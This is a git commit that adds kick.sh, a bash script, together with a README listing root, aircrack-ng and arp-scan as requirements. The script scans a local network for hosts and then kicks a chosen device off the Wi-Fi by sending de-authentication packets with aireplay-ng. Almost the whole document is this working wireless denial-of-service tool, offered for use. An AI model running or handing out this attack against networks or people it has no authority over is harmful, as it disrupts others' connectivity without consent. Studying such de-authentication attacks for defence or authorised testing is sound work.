3c4d7ab80e2a5f56761e1455ec21d29056391b6c
Andriy <arudyk.dev@gmail.com>
2014-06-18 16:36:57 -0400

    Finished everything

--- README.md
+++ README.md
@@ -1,4 +1,10 @@
 kick.sh
 =======
 
+Requirements
+------------
+- **Root permissions**
+- aircrack-ng
+- arp-scan
+
 Kicks a host from a wireless network by sending de-authenticating packet.
---
+++ kick.sh
@@ -0,0 +1,47 @@
+#!/bin/bash
+
+#
+# kick.sh <network interface> |<host bssid>|
+#
+# Andriy Rudyk (arudyk.dev@gmail.com)
+# 06/18/2014
+#
+
+NIC=$1       # Network interface
+HOST_MAC=$2  # Host to be kicked
+BSSID=$(iwconfig wlan0 | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}')
+
+#
+# Scans the localnet for all connected hosts.
+#
+function scan {
+    arp-scan -I $NIC -l # Scans localnet for all connected hosts.
+}
+
+#
+# Kicks a specified host from the network by sending de-auth packet.
+#
+function kick {
+    airmon-ng stop mon0  # Kill any monitoring device
+    airmon-ng start $NIC # Start monitoring mode
+
+    echo "[!] Kicking $HOST_MAC from $BSSID"
+    aireplay-ng -0 1 -a $BSSID -c $HOST_MAC mon0 --ignore-negative-one
+}
+
+#
+# Entry into the script, parse args.
+#
+# $1 - Network interface (i.e. wlan0)
+# $2 - Host BSSID that shall be kicked
+#
+
+if [ $# -eq 1 ]; then
+    scan
+elif [ $# -eq 2 ]; then
+    kick
+else
+    echo -e "Usage:\n"
+    echo "SCAN: kick.sh <network interface>"
+    echo "KICK: kick.sh <network interface> <target BSSID>"
+fi
